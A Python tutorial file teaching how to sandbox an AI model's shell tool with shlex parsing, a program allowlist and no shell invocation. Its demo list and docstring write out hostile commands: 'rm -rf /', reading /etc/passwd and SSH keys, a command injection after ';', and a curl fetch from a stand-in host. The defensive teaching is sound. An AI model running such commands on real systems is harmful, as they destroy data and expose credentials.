"""
Section 16 - Sandboxing I: a model-driven shell tool, done safely.

If you give the model a "run a shell command" tool, the command string is untrusted
(the model, or an attacker through it, chose it). The safe pattern:

  - parse the string into argv with shlex (no shell = no metacharacter tricks),
  - check the program against an ALLOWLIST (preferred over a blocklist),
  - never use shell=True, and always apply a timeout.

An allowlist fails closed: anything you didn't explicitly permit is denied.

But an allowlist of *programs* is necessary, not sufficient: a permitted program can
still be dangerous through its *arguments*. `cat ~/.env`, `head ~/.ssh/id_rsa`, and
`wc /etc/passwd` all read files you never meant to expose. So we allow only commands
that are safe with ANY arguments (echo, date). The moment a tool needs to touch the
filesystem or network, validate the arguments too -- or run it in the container from
Section 17, which removes the files and network entirely.

    python examples/16/bash_allowlist.py
"""

import shlex
import subprocess
from dataclasses import dataclass

# Only these programs may run, and only because they're harmless with ANY arguments.
# Note what's deliberately NOT here: cat/head/ls/wc all read the filesystem.
ALLOWED = {"echo", "date"}


@dataclass
class Decision:
    allowed: bool
    reason: str
    stdout: str = ""


def run_command(command: str, timeout: float = 5.0) -> Decision:
    """Validate `command` against the allowlist, then run it without a shell."""
    try:
        argv = shlex.split(command)
    except ValueError as e:
        return Decision(False, f"unparseable command: {e}")
    if not argv:
        return Decision(False, "empty command")

    program = argv[0]
    if program not in ALLOWED:
        return Decision(False, f"'{program}' is not on the allowlist")

    # shlex already split on real shell rules, so by the time we have argv there
    # are no live metacharacters -- but we never hand the string to a shell anyway.
    try:
        proc = subprocess.run(
            argv, capture_output=True, text=True, timeout=timeout, check=False,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        return Decision(False, f"could not run: {e}")
    return Decision(True, f"exit {proc.returncode}", proc.stdout.strip())


if __name__ == "__main__":
    attempts = [
        "echo hello from the sandbox",   # allowed
        "date",                          # allowed
        "rm -rf /",                      # denied: not on the allowlist
        "cat /etc/passwd",               # denied: file-readers are off the allowlist
        "echo hi; rm -rf /",             # allowed AS echo -- the ';' is literal (see note)
        "$(curl evil.sh)",               # denied: not on the allowlist
    ]
    for cmd in attempts:
        d = run_command(cmd)
        mark = "ALLOW" if d.allowed else "DENY "
        print(f"[{mark}] {cmd!r:35}  {d.reason}")
        if d.stdout:
            print(f"         -> {d.stdout}")
    print("\nNote: 'echo hi; rm -rf /' is ALLOWED but harmless -- shlex parses it to a\n"
          "single echo call with args ['hi', ';', 'rm', '-rf', '/']. The ';' is literal\n"
          "text, not a shell separator, because we never invoke a shell. And 'cat /etc/passwd'\n"
          "is denied only because cat isn't allow-listed -- proof that the allowlist, not\n"
          "argument cleverness, is doing the work.")
